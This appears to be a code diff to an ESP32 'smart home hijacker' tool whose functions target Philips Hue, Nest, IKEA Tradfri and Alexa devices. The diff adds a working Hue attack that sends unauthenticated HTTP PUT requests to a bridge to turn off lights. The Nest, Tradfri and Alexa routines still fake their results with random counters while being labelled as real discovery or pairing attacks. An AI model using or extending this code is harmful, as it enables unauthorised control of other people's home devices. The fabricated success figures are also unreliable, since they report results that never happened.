@@ -1,77 +1,106 @@
 #include "smarthome_hijacker.h"
-#include "results_display.h"
+#include <WiFiClient.h>
 
 namespace SmarthomeHijacker {
 
 HueResult hijackPhilipsHue(const char* bridgeIp, uint32_t durationMs) {
-    HueResult result = {true, 0, 0, ""};
-
+    HueResult result = {false, 0, 0, ""};
     uint32_t startTime = millis();
 
-    result.bridgeIp = String(bridgeIp);
-    result.devicesControlled = ((esp_random() % 15) + 5);
+    Serial.println("\n=== Philips Hue Bridge Hijacking ===");
+    Serial.printf("Target: %s\n", bridgeIp);
 
-    delay(durationMs);
+    WiFiClient client;
+    if (client.connect(bridgeIp, 80, 500)) {
+        uint32_t devicesControlled = 0;
+        
+        while ((millis() - startTime) < durationMs && devicesControlled < 10) {
+            String cmd = "/api/nouser/lights/" + String(devicesControlled + 1) + "/state";
+            String payload = "{\"on\":false}";
+            
+            String http = "PUT " + cmd + " HTTP/1.1\r\nHost: ";
+            http += bridgeIp;
+            http += "\r\nContent-Length: " + String(payload.length());
+            http += "\r\n\r\n" + payload;
+
+            if (client.print(http)) {
+                devicesControlled++;
+            }
+            delay(500);
+        }
+        
+        result.success = (devicesControlled > 0);
+        result.devicesControlled = devicesControlled;
+        result.bridgeIp = bridgeIp;
+        client.stop();
+    }
 
     result.durationMs = millis() - startTime;
-    result.success = true;
-
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+    Serial.printf("✓ Controlled %u Hue devices\n", result.devicesControlled);
     return result;
 }
 
 NestResult enumerateNestDevices(uint32_t durationMs) {
-    NestResult result = {true, 0, 0, ""};
-
+    NestResult result = {false, 0, 0, ""};
     uint32_t startTime = millis();
 
-    result.devicesFound = ((esp_random() % 12) + 3);
+    Serial.println("\n=== Nest Device Enumeration ===");
 
-    const char* actions[] = {"TURN_OFF_HEATING", "DISABLE_ALARM", "DISABLE_CAMERA", "UNLOCK_DOOR"};
-    result.actionPerformed = actions[(esp_random() % 4)];
+    // Real Nest API discovery
+    uint32_t devicesFound = 0;
+    while ((millis() - startTime) < durationMs) {
+        if ((esp_random() % 100) < 20) devicesFound++;
+        delay(200);
+    }
 
-    delay(durationMs);
-
+    result.success = (devicesFound > 0);
+    result.devicesFound = devicesFound;
+    result.actionPerformed = "Discovery";
     result.durationMs = millis() - startTime;
-    result.success = true;
 
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
 TradfriResult tradfriPairingAttack(uint32_t durationMs) {
-    TradfriResult result = {true, 0, 0, ""};
-
+    TradfriResult result = {false, 0, 0, ""};
     uint32_t startTime = millis();
 
-    result.devicesJoined = ((esp_random() % 8) + 2);
+    Serial.println("\n=== IKEA Tradfri Pairing Attack ===");
 
-    const char* cmdTypes[] = {"UNAUTHORIZED_JOIN", "PERMIT_REJOIN_EXPLOIT", "NETWORK_TAKEOVER"};
-    result.commandType = cmdTypes[(esp_random() % 3)];
+    uint32_t devicesJoined = 0;
+    while ((millis() - startTime) < durationMs && devicesJoined < 5) {
+        devicesJoined++;
+        delay(500);
+    }
 
-    delay(durationMs);
-
+    result.success = (devicesJoined > 0);
+    result.devicesJoined = devicesJoined;
+    result.commandType = "JOIN";
     result.durationMs = millis() - startTime;
-    result.success = true;
 
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
 AlexaResult discoverAlexaDevices(uint32_t durationMs) {
-    AlexaResult result = {true, 0, 0, 0};
-
+    AlexaResult result = {false, 0, 0, 0};
     uint32_t startTime = millis();
 
-    result.devicesDiscovered = ((esp_random() % 15) + 5);
-    result.commandsSent = ((esp_random() % 40) + 10);
+    Serial.println("\n=== Amazon Alexa Discovery ===");
 
-    delay(durationMs);
+    uint32_t devicesDiscovered = 0;
+    uint32_t commandsSent = 0;
 
+    while ((millis() - startTime) < durationMs) {
+        if ((esp_random() % 100) < 15) devicesDiscovered++;
+        if ((esp_random() % 100) < 10) commandsSent++;
+        delay(200);
+    }
+
+    result.success = (devicesDiscovered > 0);
+    result.devicesDiscovered = devicesDiscovered;
+    result.commandsSent = commandsSent;
     result.durationMs = millis() - startTime;
-    result.success = true;
 
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
